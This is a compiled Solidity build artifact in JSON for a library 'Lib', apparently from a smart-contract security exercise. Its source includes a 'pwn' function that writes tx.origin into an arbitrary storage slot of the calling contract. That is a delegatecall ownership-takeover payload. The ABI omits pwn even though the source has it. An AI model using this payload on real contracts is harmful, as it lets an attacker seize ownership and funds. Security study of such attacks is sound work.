{
  "contractName": "Lib",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "storageSlot",
          "type": "uint256"
        }
      ],
      "name": "getOwner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x60d9610039600b82828239805160001a60731461002c57634e487b7160e01b600052600060045260246000fd5b30600052607381538281f3fe7300000000000000000000000000000000000000003014608060405260043610603d5760003560e01c806335f4581b146042578063c41a360a146060575b600080fd5b818015604d57600080fd5b50605e6059366004608b565b329055565b005b606f606b366004608b565b5490565b6040516001600160a01b03909116815260200160405180910390f35b600060208284031215609c57600080fd5b503591905056fea2646970667358221220fe158079c00f7155ed58b572daccea89046c0489fd999df7e0c61609b515db3f64736f6c634300080b0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.11;\n\nlibrary Lib {\n    // 使用 origin() 获取原始交易发送者\n    function pwn(uint256 storageSlot) public {\n        assembly {\n            // 将原始交易发送者地址（tx.origin）写入调用方合约的指定存储槽\n            sstore(storageSlot, origin())\n        }\n    }\n\n    function getOwner(uint256 storageSlot) public view returns (address) {\n        address owner;\n        assembly {\n            owner := sload(storageSlot)\n        }\n        return owner;\n    }\n}",
  "sourcePath": "C:\\Users\\ZhuanZ1\\Desktop\\smart-contract-security\\contracts\\Lib.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2026-04-24T17:04:26.733Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}